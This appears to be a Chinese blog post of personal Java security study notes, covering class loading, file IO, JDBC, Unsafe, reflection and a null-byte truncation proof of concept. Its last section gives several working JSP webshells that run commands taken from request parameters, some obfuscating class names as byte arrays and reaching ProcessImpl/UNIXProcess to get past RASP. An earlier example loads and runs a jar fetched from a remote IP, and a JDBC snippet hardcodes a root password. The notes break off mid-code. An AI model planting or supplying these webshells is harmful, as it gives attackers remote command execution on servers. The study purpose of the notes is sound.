---
title: java
date: 2023-09-07 16:08:17
categories:
- 网络安全
tags:
- web
- java
description: |
    测,怎么这么难
---

## ClassLoader类加载机制

Java程序在运行前需要先编译成`class文件`，Java类初始化的时候会调用`java.lang.ClassLoader`加载类字节码，`ClassLoader`会调用JVM的native方法(`defineClass0/1/2`)来定义一个`java.lang.Class`实例。

### ClassLoader

包含以下几个ClassLoader：
\- `Bootstrap ClassLoader` (引导类加载器) 该类加载器实现于JVM层，采用C++编写
\- `Extension ClassLoader` (扩展类加载器)
\- `App ClassLoader` (系统类加载器) 默认的类加载器

ClassLoader的核心方法有：

1. `loadClass` (加载指定的Java类)
2. `findClass` (查找指定的Java类)
3. `findLoadedClass` (查找JVM已经加载过的类)
4. `defineClass` (定义一个Java类)
5. `resolveClass` (链接指定的Java类)

### 类加载方式

#### 显式加载

```java
// 反射加载TestHelloWorld示例
Class.forName("top.longlone.TestHelloWorld");
// ClassLoader加载TestHelloWorld示例
this.getClass().getClassLoader().loadClass("top.longlone.TestHelloWorld");

```

#### 隐式加载

指直接`类名.方法名()`或`new`类实例。

### 类加载流程

- 调用`loadClass`加载
- 调用`findLoadClass`检查是否已加载,若加载则返回已加载的类
- 如果创建ClassLoader时传入了父类加载器(`new ClassLoader(父类加载器)`)则使用父类加载器先加载,否则使用JVM的`Bootstrap ClassLoader`加载
- 若父类加载器无法加载则调用`findClass`加载
- 如果调用loadClass的时候传入的`resolve`参数为true,那么还需要调用`resolveClass`方法链接类,默认为false
- 加载失败或返回加载后的`java.lang.Class`类对象

### 自定义ClassLoader

```java
package zip.dionysus;
import java.util.Base64;
import java.lang.reflect.Method;

public class ClassLoaderStudy extends ClassLoader{
    private static final String testClassName = "zip.dionysus.Hello";
    private static final byte[] testClassBytes = Base64.getDecoder().decode("yv66vgAAAD8AMQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWEgAAAAgMAAkACgEAF21ha2VDb25jYXRXaXRoQ29uc3RhbnRzAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsJAAwADQcADgwADwAQAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwgAEgEADUhlbGxvLCB3b3JsZCEKABQAFQcAFgwAFwAYAQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYHABoBABJ6aXAvZGlvbnlzdXMvSGVsbG8BAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAFaGVsbG8BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhAQAQQm9vdHN0cmFwTWV0aG9kcw8GACQKACUAJgcAJwwACQAoAQAkamF2YS9sYW5nL2ludm9rZS9TdHJpbmdDb25jYXRGYWN0b3J5AQCYKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL2ludm9rZS9DYWxsU2l0ZTsIACoBAAlIZWxsbywgASEBAAxJbm5lckNsYXNzZXMHAC0BACVqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwBwAvAQAeamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzAQAGTG9va3VwACEAGQACAAAAAAADAAEABQAGAAEAGwAAAB0AAQABAAAABSq3AAGxAAAAAQAcAAAABgABAAAAAwABAB0ACgABABsAAAAfAAEAAgAAAAcrugAHAACwAAAAAQAcAAAABgABAAAABQAJAB4AHwABABsAAAAlAAIAAQAAAAmyAAsSEbYAE7EAAAABABwAAAAKAAIAAAAJAAgACgADACAAAAACACEAIgAAAAgAAQAjAAEAKQArAAAACgABACwALgAwABk=");
    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException{
        if(name.equals(testClassName)){
            return defineClass(testClassName,testClassBytes,0,testClassBytes.length);
        }
        return super.findClass(name);
    }
    public static void main(String[] args)throws Exception{
        ClassLoaderStudy loader = new ClassLoaderStudy();
        Class<?> testClass = loader.loadClass(testClassName);
        Object o =testClass.newInstance();
        Method sayHello = o.getClass().getMethod("hello",String.class);
        String dionysus =(String) sayHello.invoke(o,"Dionysus");
        System.out.println(dionysus);
    }
}
```

### URLClassLoader

```java
package zip.dionysus;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;
public class URLClassLoaderStudy {
    public static void main(String[] args)throws Exception {
        URL url = new URL("http://107.172.141.31/cmd.jar");
        URLClassLoader loader = new URLClassLoader(new URL[]{url});
        String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
        Class<?> cmdClass = loader.loadClass("zip.dionysus.CMD");
        Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);
        InputStream in = process.getInputStream();
        ByteArrayOutputStream byteArrayInputStream = new ByteArrayOutputStream();
        byte[] bytes = new byte[1024];
        int a = -1;
        while ((a = in.read(bytes)) != -1) {
            byteArrayInputStream.write(bytes, 0, a);
        }
        System.out.println(byteArrayInputStream.toString());
    }
}

```

## java文件系统

Java se 内置了两类文件系统 `java.io`和`java.nio`,后者的视线是`sun.nio`

![javaio](https://img.siren.blue/post_img/javaio.png)

### java io

Java抽象出一个文件系统的对象`java.io.FileSystem`,有win和unix两种文件系统`WinNTFi了System`和`UnixFileSystem`

`java.io.FileSystem`是一个抽象类实现了跨平台的文件访问操作

需要注意的点有：

1. 并不是所有的文件操作都在`java.io.FileSystem`中定义,文件的读取最终调用的是`java.io.FileInputStream#read0、readBytes`、`java.io.RandomAccessFile#read0、readBytes`,而写文件调用的是`java.io.FileOutputStream#writeBytes`、`java.io.RandomAccessFile#write0`。
2. Java有两类文件系统API！一个是基于`阻塞模式的IO`的文件系统，另一是JDK7+基于`NIO.2`的文件系统。

```java
package zip.dionysus;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
public class FileInputStreamStudy {
    public static void main(String[] args)throws Exception{
        File file = new File("/Users/dionysus/secret");
        FileInputStream fileInputStream = new FileInputStream(file);
        int a=0;
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        while((a=fileInputStream.read())!=-1){
            byteArrayOutputStream.write(a);
            System.out.print((char)a);
        }
        System.out.println(byteArrayOutputStream.toString());
//        别轻易执行!!!!!!!!!!!!!!!!!!!!!
//        String str = "hello world";
//        FileOutputStream fileOutputStream = new FileOutputStream(file);
//        fileOutputStream.write(str.getBytes(StandardCharsets.UTF_8));
//        fileOutputStream.flush();
//        fileOutputStream.close();
//        别轻易执行!!!!!!!!!!!!!!!!!!!!!
    }
}

```

JAVA NIO.2 文件系统#
Java 7提出了一个基于NIO的文件系统，这个NIO文件系统和阻塞IO文件系统两者是完全独立的。`java.nio.file.spi.FileSystemProvider`对文件的封装和`java.io.FileSystem`同理。
NIO的文件操作在不同的系统的最终实现类也是不一样的，比如Mac的实现类是: `sun.nio.fs.UnixNativeDispatcher`,而Windows的实现类是`sun.nio.fs.WindowsNativeDispatcher`。
合理的利用NIO文件系统这一特性我们可以绕过某些只是防御了`java.io.FileSystem`的WAF/RASP

## JDBC

JDBC(Java Database Connectivity)是Java提供对数据库进行连接、操作的标准API。Java自身并不会去实现对数据库的连接、查询、更新等操作而是通过抽象出数据库操作的API接口(JDBC)，不同的数据库提供商必须实现JDBC定义的接口从而也就实现了对数据库的一系列操作

### connect

`java`通过`java.sql.DriverManager`来管理所有数据库的驱动注册，所以如果想要建立数据库连接需要先在`java.sql.DriverManager`中注册对应的驱动类，然后调用`getConnection`方法才能连接上数据库

`JDBC`定义了一个叫`java.sql.Driver`的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。`java.sql.DriverManager.getConnection(xx)`其实就是间接的调用了`java.sql.Driver`类的`connect`方法实现数据库连接的。数据库连接成功后会返回一个叫做`java.sql.Connection`的数据库连接对象，一切对数据库的查询操作都将依赖于这个`Connection`对象

```java
package zip.dionysus;

import java.sql.DriverManager;
import java.sql.Connection;

public class sql_connection {
    private static final String CLASS_NAME = "com.mysql.cj.jdbc.Driver";
    private static final String URL = "jdbc:mysql://localhost:3306/";
    private static final String USERNAME = "root";
    private static final String PASSWORD = "ljw147585/";

    public static void main(String[] args) {
        try {
            Class.forName(CLASS_NAME);
            Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);
            if (connection != null) {
                System.out.println("ok");
                connection.close();
            }
        } catch (Exception e) {
            System.exit(1);
        }
    }
}

```

### 数据库配置信息

数据库配置信息寻找方法

传统的Web应用的配置信息存放路径
\- `WEB-INF`目录下的`*.properites .yml *.xml`
\- Spring boot项目:`src/main/resources/`

常见的存储数据库配置信息的文件路径
\- `WEB-INF/applicationContext.xml`
\- `WEB-INF/hibernate.cfg.xml`
\- `WEB-INF/jdbc/jdbc.properties`
\- 使用系统命令寻找,如寻找mysql: `find 路径 -type f |xargs grep "com.mysql.jdbc.Driver"`

需要`Class.forName`的原因: 在Driver的static中注册了驱动包

`Class.forName("com.mysql.jdbc.Driver")`实际上会触发类加载，`com.mysql.jdbc.Driver`类将会被初始化，所以`static`静态语句块中的代码也将会被执行

反射类而不想触发类静态代码块的途径
\- `Class.forName("xxxx", false, loader)`
\- `ClassLoader.load("xxxx")`

`Class.forName`可以省去的原因
\- 实际上这里又利用了`Java`的一大特性:`Java SPI(Service Provider Interface)`，因为`DriverManager`在初始化的时候会调用`java.util.ServiceLoader`类提供的SPI机制，Java会自动扫描jar包中的`META-INF/services`目录下的文件，并且还会自动的`Class.forName`(文件中定义的类)

## Unsafe

`sun.misc.Unsafe`是Java底层API(`仅限Java内部使用,反射可调用`)提供的一个神奇的Java类，`Unsafe`提供了非常底层的`内存、CAS、线程调度、类、对象`等操作、`Unsafe`正如它的名字一样它提供的几乎所有的方法都是不安全的

### 私有构造方法

通过反射创建一个`Unsafe`实例

```java
public static void main(String[] args) throws Exception {
        Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Constructor<?> declaredConstructor = unsafeClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        Unsafe unsafe = (Unsafe) declaredConstructor.newInstance();
        System.out.println(unsafe);
    }
```

### 私有属性的theUnsafe

通过`Unsafe`获取`theUnsafe`实例

```java
Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Field theUnsafe = unsafeClass.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        System.out.println(unsafe);
```

### allocateInstance无视构造方法创建类实例

```java
class UnsafeTest{
    static {
        System.out.println("Static block executed.");
    }
    static int test=test();
    static int test(){
        System.out.println("test");
        return 0;
    }
    static void hello(){
        System.out.println("hello");
    }
    private UnsafeTest(){
        System.out.println("UnsafeTest");
    }
    @Override
    public String toString() {
        return "UnsafeTest{}";
    }
}

public class Unsafestudy {
    public static void main(String[] args) throws Exception {
          Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field theUnsafe = unsafeClass.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            Unsafe unsafe = (Unsafe) theUnsafe.get(null);
            UnsafeTest unsafeTest = (UnsafeTest) unsafe.allocateInstance(UnsafeTest.class);
            System.out.println(unsafeTest);
    }
}
```

探究了一下,静态块的会在创建时执行,静态变量也是

`allocateInstance`会无视构造方法,所以失效

Google的`GSON`库在JSON反序列化的时候就使用这个方式来创建类实例，在渗透测试中也会经常遇到这样的限制，比如RASP限制了`java.io.FileInputStream`类的构造方法导致我们无法读文件或者限制了`UNIXProcess/ProcessImpl`类的构造方法导致我们无法执行本地命令等。

### defineClass调用JVM创建类对象

```java
private static final String TEST_CLASS_NAME = "zip.dionysus.Hello";
    private static final byte[] TEST_CLASS_BYTES = Base64.getDecoder().decode("yv66vgAAADQALgoADAAXBwAYCgACABcIABkKAAIAGggAGwoAAgAcCQAdAB4IAB8KACAAIQcAIgcAIwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAVoZWxsbwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwADQAOAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAdIZWxsbywgDAAkACUBAAEhDAAmACcHACgMACkAKgEADUhlbGxvLCB3b3JsZCEHACsMACwALQEAEnppcC9kaW9ueXN1cy9IZWxsbwEAEGphdmEvbGFuZy9PYmplY3QBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACwAMAAAAAAADAAEADQAOAAEADwAAAB0AAQABAAAABSq3AAGxAAAAAQAQAAAABgABAAAAAwABABEAEgABAA8AAAAxAAIAAgAAABm7AAJZtwADEgS2AAUrtgAFEga2AAW2AAewAAAAAQAQAAAABgABAAAABQAJABMAFAABAA8AAAAlAAIAAQAAAAmyAAgSCbYACrEAAAABABAAAAAKAAIAAAAJAAgACgABABUAAAACABY=");
    public static void main(String[] args) throws Exception {    Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
        Field theUnsafe = unsafeClass.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);

        //获取系统的类加载器
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        //创建默认的保护域
        //ProtectionDomain domain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), null, classLoader, null);
        //调用JVM创建类对象

        Class<?> helloClass = unsafe.defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length, classLoader, null);
        Constructor<?> declaredConstructor = helloClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        Object hello = declaredConstructor.newInstance();
        Method helloMethod = helloClass.getMethod("hello",String.class);
        Object dionysus = (String)helloMethod.invoke(hello,"sein");
        System.out.println(dionysus);
    }

```

## java IO/NIO多种读写文件方式

我们通常读写文件都是使用的阻塞模式，与之对应的也就是`java.io.FileSystem`。`java.io.FileInputStream`类提供了对文件的读取功能，java的其他读取文件的方法基本上都是封装了`java.io.FileInputStream`类，比如：`java.io.FileReader`。

### FileInputStream

`FileInputStream`调用链

```bash
java.io.FileInputStream.readBytes(FileInputStream.java:219)
java.io.FileInputStream.read(FileInputStream.java:233)
com.anbai.sec.filesystem.FileInputStreamDemo.main(FileInputStreamDemo.java:27)
```

1. 首先，`com.anbai.sec.filesystem.FileInputStreamDemo.main` 调用了 `java.io.FileInputStream.read`。
2. 然后，`java.io.FileInputStream.read` 内部调用了 `java.io.FileInputStream.readBytes`。

其中readBytes是native方法，文件的打开、关闭等方法也都是native方法

```java
private native int readBytes(byte b[], int off, int len) throws IOException;
private native void open0(String name) throws FileNotFoundException;
private native int read0() throws IOException;
private native long skip0(long n) throws IOException;
private native int available0() throws IOException;
private native void close0() throws IOException;
```

### RandomAccessFileStudy

```java
package zip.dionysus;

import java.io.*;
public class RandomAccessFileStudy {
    public static void main(String[] args)throws Exception{
        File file = new File("/Users/dionysus/secret");
        try{
            // 创建一个RandomAccessFile对象
            //rws 读写同步,rwd 读写内容或元数据同步,r 读,rw 读写,d 元数据
            RandomAccessFile randomAccessFile = new RandomAccessFile(file,"r");
            int a=0;
            byte[] bytes = new byte[1024];
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            while((a = randomAccessFile.read(bytes))!=-1){
                byteArrayOutputStream.write(bytes,0,a);

/*                    如果是写入 rw打开

                String content = "str";
                randomAccessFile.write(content.getBytes());
                randomAccessFile.close();

*/
            }
            System.out.println(byteArrayOutputStream.toString());
        } catch (IOException e){
            e.printStackTrace();
        }
    }
}

```

### FileSystemProvider

JDK7新增的NIO.2的`java.nio.file.spi.FileSystemProvider`,利用`FileSystemProvider`可以利用支持异步的通道(`Channel`)模式读取文件内容

`java.nio.file.Files`是JDK7开始提供的一个对文件读写取非常便捷的API，其底层实在是调用了``java.nio.file.spi.FileSystemProvider`来实现对文件的读写的。最为底层的实现类是`sun.nio.ch.FileDispatcherImpl#read0`

```java
package zip.dionysus;

import java.io.File;
import java.io.IOException;
import java.nio.file.*;

class NIO{
    void read(){
        Path path=Paths.get("/Users/dionysus/secret");
        try{
            byte[] bytes=Files.readAllBytes(path);
            System.out.println(new String(bytes));
        }catch (IOException e){
            e.printStackTrace();
        }
    }
    void write(){
        Path path=Paths.get("/Users/dionysus/secret");
        String content = "str";
        try{
            Files.write(path,content.getBytes());
        }catch (IOException e){
        }
    }
}
public class FileSystemProviderStudy {
    public static void main(String[] args) {
        NIO nio=new NIO();
        nio.read();
        //nio.write();
    }
}

```

方便很多了

## 洞

### 文件名空字节截断漏洞

漏洞历史

- 漏洞存在于`java SE 7 update 40`之前
- 漏洞在`2013年9月10日`发布的`java SE 7 Update 40`修复
- 修复方法: 在`java.io.File`类中添加了一个`isInvalid`方法，专门检测文件名中是否包含了空字节, 修复的JDK版本所有跟文件名相关的操作都调用了isInvalid方法检测，防止文件名空字节截断

```java
 final boolean isInvalid() {
     if (status == null) {
         status = (this.path.indexOf('\u0000') < 0) ? PathStatus.CHECKED : PathStatus.INVALID;
     }
     return status == PathStatus.INVALID;
 }
```

poc

```java
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class FileNullBytes {

    public static void main(String[] args) {
        try {
            String           fileName = "/tmp/null-bytes.txt\u0000.jpg";
            FileOutputStream fos      = new FileOutputStream(new File(fileName));
            fos.write("Test".getBytes());
            fos.flush();
            fos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
// 使用JDK1.7.0.40之前的版本成功截断写入null-bytes.txt
// 使用JDK1.7.0.40及之后的版本抛出java.io.FileNotFoundException: Invalid file path异常

```

利用场景

Java空字节截断利用场景最常见的利用场景就是文件上传时后端获取文件名后使用了`endWith`、正则使用如:`.(jpg|png|gif)$`验证文件名后缀合法性且文件名最终原样保存,同理文件删除(`delete`)、获取文件路径(`getCanonicalPath`)、创建文件(`createNewFile`)、文件重命名(`renameTo`)等方法也可适用。

## JAVA反射

### 获取class对象

**获取Runtime类Class对象代码片段：**

```java
String className     = "java.lang.Runtime";
Class  runtimeClass1 = Class.forName(className);
Class  runtimeClass2 = java.lang.Runtime.class;
Class  runtimeClass3 = ClassLoader.getSystemClassLoader().loadClass(className);
```

通过以上任意一种方式就可以获取`java.lang.Runtime`类的Class对象了，反射调用内部类的时候需要使用`$`来代替`.`,如`com.anbai.Test`类有一个叫做`Hello`的内部类，那么调用的时候就应该将类名写成：`com.anbai.Test$Hello`

```java
获取数组对象
Class<?> doubleArray = Class.forName("[D");//相当于double[].class
Class<?> cStringArray = Class.forName("[[Ljava.lang.String;");// 相当于String[][].class

```

**反射Runtime执行本地命令代码片段：**

```java
// 获取Runtime类对象
Class runtimeClass1 = Class.forName("java.lang.Runtime");

// 获取构造方法
Constructor constructor = runtimeClass1.getDeclaredConstructor();
constructor.setAccessible(true);

// 创建Runtime类示例，等价于 Runtime rt = new Runtime();
Object runtimeInstance = constructor.newInstance();

// 获取Runtime的exec(String cmd)方法
Method runtimeMethod = runtimeClass1.getMethod("exec", String.class);

// 调用exec方法，等价于 rt.exec(cmd);
Process process = (Process) runtimeMethod.invoke(runtimeInstance, cmd);

// 获取命令执行结果
InputStream in = process.getInputStream();

// 输出命令执行结果
System.out.println(org.apache.commons.io.IOUtils.toString(in, "UTF-8"));
```

### 反射创建类实例

在Java的`任何一个类都必须有一个或多个构造方法`，如果代码中没有创建构造方法那么在类编译的时候会自动创建一个无参数的构造方法。

**Runtime类构造方法示例代码片段:**

```java
public class Runtime {

   /** Don't let anyone else instantiate this class */
  private Runtime() {}

}
```

`runtimeClass1.getDeclaredConstructor`和`runtimeClass1.getConstructor`都可以获取到类构造方法，区别在于后者无法获取到私有方法，所以一般在获取某个类的构造方法时候我们会使用前者去获取构造方法。如果构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组，如：`clazz.getDeclaredConstructor(String.class, String.class)`。

如果我们想获取类的所有构造方法可以使用：`clazz.getDeclaredConstructors`来获取一个`Constructor`数组。

获取到`Constructor`以后我们可以通过`constructor.newInstance()`来创建类实例,同理如果有参数的情况下我们应该传入对应的参数值，如:`constructor.newInstance("admin", "123456")`。当我们没有访问构造方法权限时我们应该调用`constructor.setAccessible(true)`修改访问权限就可以成功的创建出类实例了。

## 反射调用类方法

`Class`对象提供了一个获取某个类的所有的成员方法的方法，也可以通过方法名和方法参数类型来获取指定成员方法。

**获取当前类所有的成员方法：**

```java
Method[] methods = clazz.getDeclaredMethods()
```

**获取当前类指定的成员方法：**

```java
Method method = clazz.getDeclaredMethod("方法名");
Method method = clazz.getDeclaredMethod("方法名", 参数类型如String.class，多个参数用","号隔开);
```

`getMethod`和`getDeclaredMethod`都能够获取到类成员方法，区别在于`getMethod`只能获取到`当前类和父类`的所有有权限的方法(如：`public`)，而`getDeclaredMethod`能获取到当前类的所有成员方法(不包含父类)。

**反射调用方法**
获取到`java.lang.reflect.Method`对象以后我们可以通过`Method`的`invoke`方法来调用类方法。

**调用类方法代码片段：**

```java
method.invoke(方法实例对象, 方法参数值，多个参数值用","隔开);
```

`method.invoke`的第一个参数必须是类实例对象，如果调用的是`static`方法那么第一个参数值可以传`null`，因为在java中调用静态方法是不需要有类实例的，因为可以直接`类名.方法名(参数)`的方式调用。

`method.invoke`的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的`依次传入对应的参数类型`。

## 反射调用成员变量

Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。

**获取当前类的所有成员变量：**

```java
Field fields = clazz.getDeclaredFields();
```

**获取当前类指定的成员变量：**

```java
Field field  = clazz.getDeclaredField("变量名");
```

`getField`和`getDeclaredField`的区别同`getMethod`和`getDeclaredMethod`。

**获取成员变量值：**

```java
Object obj = field.get(类实例对象);
```

**修改成员变量值：**

```java
field.set(类实例对象, 修改后的值);
```

同理，当我们没有修改的成员变量权限时可以使用: `field.setAccessible(true)`的方式修改为访问成员变量访问权限。

如果我们需要修改被`final`关键字修饰的成员变量，那么我们需要先修改方法

```java
// 反射获取Field类的modifiers
Field modifiers = field.getClass().getDeclaredField("modifiers");

// 设置modifiers修改权限
modifiers.setAccessible(true);

// 修改成员变量的Field对象的modifiers值
modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);

// 修改成员变量值,这里的field在之前已经绑定了数据
field.set(类实例对象, 修改后的值);
```

## 本地命令执行

### Runtime

逻辑

- `Runtime.exec(xxxx)`
- `java.lang.ProcessBuilder.start()`
- `new java.lang.UNIXProcess(xxx)`
- `UNIXProcess`的构造方法调用了`forkAndExec(xxx)` native方法
- `forkAndExec`调用操作系统级别`fork`=>`exec(*nix)/CreateProcess`(Windows)执行命令并返回`fork`/`CreateProcess`的`PID`

```jsp
// 一句话命令执行jsp木马(无回显)
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>

// 命令执行jsp木马(有回显) ?cmd=命令

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
//        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
        InputStream in = new ProcessBuilder(cmd).start().getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        byte[] b = new byte[1024];
        int a = -1;

        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }
        out.write("<pre>" + new String(baos.toByteArray()) + "</pre>");
    }

%>

// 反射Runtime命令执行
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Scanner" %>

<%
    String str = request.getParameter("str");

    // 定义"java.lang.Runtime"字符串变量
    String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101});

    // 反射java.lang.Runtime类获取Class对象
    Class<?> c = Class.forName(rt);

    // 反射获取Runtime类的getRuntime方法
    Method m1 = c.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101}));

    // 反射获取Runtime类的exec方法
    Method m2 = c.getMethod(new String(new byte[]{101, 120, 101, 99}), String.class);

    // 反射调用Runtime.getRuntime().exec(xxx)方法
    Object obj2 = m2.invoke(m1.invoke(null, new Object[]{}), new Object[]{str});

    // 反射获取Process类的getInputStream方法
    Method m = obj2.getClass().getMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}));
    m.setAccessible(true);

    // 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串
    Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]{})).useDelimiter("\\A");
    String result = s.hasNext() ? s.next() : "";

    // 输出命令执行结果
    out.println(result);
%>

```

好怪的jsp

### ProcessBuilder命令执行

`Runtime.exec`最终会调用`ProcessBuilder`执行系统命令,所以我们可以直接调用`ProcessBuilder`来执行系统命令

```jsp
// windows下可以尝试执行 cmd=cmd.exe&cmd=/c&cmd=whoami
// linux下可以尝试执行   cmd=/bin/sh&cmd=-c&cmd=cd%20/Users/;ls%20-la

<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.InputStream" %>
<%
    InputStream in = new ProcessBuilder(request.getParameterValues("cmd")).start().getInputStream();
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    byte[] b = new byte[1024];
    int a = -1;
    while((a=in.read(b)) != -1) {
        baos.write(b,0,a);
    }
    out.write("<p>" + new String(baos.toByteArray()) + "</p>");
%>

```

### 反射UNIXProcess/ProcessImpl命令执行

全都暂存

`UNIXProcess`和`ProcessImpl`可以理解本就是一个东西,在JDK9的时候把`UNIXProcess`合并到了`ProcessImpl`

`UNIXProcess`和`ProcessImpl`其实就是最终调用`native`执行系统命令的类，这个类提供了一个叫`forkAndExec`的`native`方法，如方法名所述主要是通过`fork&exec`来执行本地系统命令

利用这个更加底层的`UNIXProcess/ProcessImpl`执行系统命令可以尝试绕过RASP

```jsp
// 反射UNIXProcess/ProcessImpl执行系统命令

// windows下反射ProcessImpl 调用start方法执行系统命令,start方法实质是创建了一个ProcessImpl的实例
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.ByteArrayOutputStream" %>

<%
    String[] cmd = request.getParameterValues("cmd");
    if (cmd != null) {
        Class<?> clazz = Class.forName("java.lang.ProcessImpl");
        Method method = clazz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        method.setAccessible(true);
        Process p = (Process) method.invoke(null, cmd, null, ".", null, true);
        InputStream in = p.getInputStream();
        byte[] b = new byte[1024];
        int a = -1;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        while ((a = in.read(b)) != -1) {
            baos.write(b, 0, a);
        }
        out.write("<p>" + baos.toString() + "</p>");
    }
%>

// windows下反射ProcessImpl新建实例执行系统命令
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.ByteArrayOutputStream" %>

<%
    String[] cmd = request.getParameterValues("cmd");
    if (cmd != null) {
        Class<?> clazz = Class.forName("java.lang.ProcessImpl");
        Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        Object object = constructor.newInstance(cmd, null, ".", new long[]{0}, true);
    }
%>

// 类unix下反射UNIXProcess/ProcessImpl构造实例执行系统命令
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>

<%!
    byte[] toCString(String s) {
        if (s == null) {
            return null;
        }

        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0, result, 0, bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }

    InputStream start(String[] strs) throws Exception {
        // java.lang.UNIXProcess
        String unixClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115});

        // java.lang.ProcessImpl
        String processClass = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108});

        Class clazz = null;

        // 反射创建UNIXProcess或者ProcessImpl
        try {
